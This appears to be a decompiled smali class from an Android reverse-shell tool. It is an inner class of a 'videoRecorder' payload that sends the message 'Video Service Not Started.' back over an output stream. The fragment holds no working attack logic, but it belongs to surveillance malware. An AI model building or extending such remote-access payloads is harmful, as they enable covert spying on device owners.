.class Lcom/example/reverseshell2/Payloads/videoRecorder$2;
.super Ljava/lang/Object;
.source "videoRecorder.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/example/reverseshell2/Payloads/videoRecorder;->videoStop(Ljava/io/OutputStream;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/example/reverseshell2/Payloads/videoRecorder;

.field final synthetic val$outputStream:Ljava/io/OutputStream;


# direct methods
.method constructor <init>(Lcom/example/reverseshell2/Payloads/videoRecorder;Ljava/io/OutputStream;)V
    .locals 0
    .param p1, "this$0"    # Lcom/example/reverseshell2/Payloads/videoRecorder;

    .line 184
    iput-object p1, p0, Lcom/example/reverseshell2/Payloads/videoRecorder$2;->this$0:Lcom/example/reverseshell2/Payloads/videoRecorder;

    iput-object p2, p0, Lcom/example/reverseshell2/Payloads/videoRecorder$2;->val$outputStream:Ljava/io/OutputStream;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 3

    .line 188
    :try_start_0
    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/videoRecorder$2;->val$outputStream:Ljava/io/OutputStream;

    const-string v1, "Video Service Not Started.\n"

    const-string v2, "UTF-8"

    invoke-virtual {v1, v2}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/io/OutputStream;->write([B)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 189
    return-void

    .line 190
    :catch_0
    move-exception v0

    .line 191
    .local v0, "ex":Ljava/io/IOException;
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    .line 193
    .end local v0    # "ex":Ljava/io/IOException;
    return-void
.end method
